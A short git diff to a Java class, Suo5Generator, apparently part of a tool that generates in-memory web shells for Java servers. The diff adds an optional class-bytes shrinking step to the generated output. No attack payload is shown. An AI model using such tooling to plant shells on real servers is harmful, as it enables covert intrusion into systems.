@@ -1,5 +1,6 @@
 package com.reajason.javaweb.memshell.generator;
 
+import com.reajason.javaweb.ClassBytesShrink;
 import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
@@ -59,7 +60,7 @@ public class Suo5Generator {
     public byte[] getBytes() {
         DynamicType.Builder<?> builder = getBuilder();
         try (DynamicType.Unloaded<?> make = builder.make()) {
-            return make.getBytes();
+            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
         }
     }
 }
